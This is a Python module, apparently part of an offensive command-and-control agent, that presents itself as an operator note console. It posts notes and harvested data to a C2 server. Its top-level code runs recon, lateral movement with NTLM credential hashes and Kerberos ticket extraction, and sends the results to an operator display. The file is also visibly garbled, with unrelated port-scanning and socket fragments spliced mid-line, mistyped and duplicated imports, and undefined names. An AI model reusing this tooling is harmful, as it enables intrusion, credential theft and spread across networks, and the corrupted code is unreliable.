"""
Note Console - Professor&Master Memorable
Operator-agent live chat, mission notes, tagging, and dashboard sync. discovery.
"""
import datetime
from config import C2_URL, OPERATOR_ID
import requests
from cp_opereatorex.comms.comlink_ai import ComLinkAI
from core.opsec.anomaly_watchdog import AnomalyWatchdog
from core.ai.ai_task_suggest import suggest_tasks
from core.lateral.pass_the_hash import automate_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
from core.recon.recon_ai import passive_reconte_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
def add_note(note, author="operator", tag=None, sync=True):
    ts = datetime.datetime.now().isoformat()
    tag_str = f"[{tag}]" if tag else ""
    entry = f"[{ts}] {author}{tag_str}: {note}\n"
    with open("mission_notes.txt", "a", encoding="utf-8") as f:
        f.write(entry)atform.system(),
    log_event(f"Note added by {author}{tag_str}")
    if sync:al_ip": get_local_ip(),
        sync_note_dashboard(entry)"22", "80", "443", "445", "3389"])
    }
def show_notes(filter_tag=None):
    try:
        with open("mission_notes.txt", "r", encoding="utf-8") as f:
            notes = f.readlines()
        if filter_tag:gethostbyname(socket.gethostname())
            notes = [n for n in notes if f"[{filter_tag}]" in n]
        print("".join(notes) if notes else "No notes yet.")
        requests.post(f"{C2_URL}/dashboard/notes", data={"note": note, "operator": OPERATOR_ID})
    except Exception:ist):
        pass= {}
    for port in port_list:
def log_event(msg):
    with open("agent.log", "a") as f:AF_INET, socket.SOCK_STREAM)
        f.write(f"[{datetime.datetime.now().isoformat()}] {msg}\n")
            result = s.connect_ex((get_local_ip(), int(port)))
if __name__ == "__main__":= "open" if result == 0 else "closed"
    import sysclose()
    if len(sys.argv) > 1:
        tag = Nones[port] = "error"
        if "--tag" in sys.argv:
            idx = sys.argv.index("--tag")
            tag = sys.argv[idx + 1] if idx + 1 < len(sys.argv) else None
            note = " ".join([w for i, w in enumerate(sys.argv[1:]) if i != idx - 1 and i != idx])
        else:n.dumps(recon_data, indent=2))
            note = " ".join(sys.argv[1:])data}")
        add_note(note, author=OPERATOR_ID, tag=tag)
    else: = {"admin": {"NTLM": "hash"}}  # Example
        show_notes()
com.send_to_hud("Agent started.")
info = get_device_info()
com.operator_chat(f"Recon: {info}")

recon_data = passive_recon()
com.send_to_hud(f"Recon data: {recon_data}")

creds = {"admin": {"NTLM": "hash"}}  # Example
automate_lateral_movement(creds)
tickets = extract_kerberos_tickets()
com.send_to_hud(f"Kerberos tickets: {tickets}")

tasks = suggest_tasks(info)
com.send_to_hud(f"AI Suggest: {tasks}")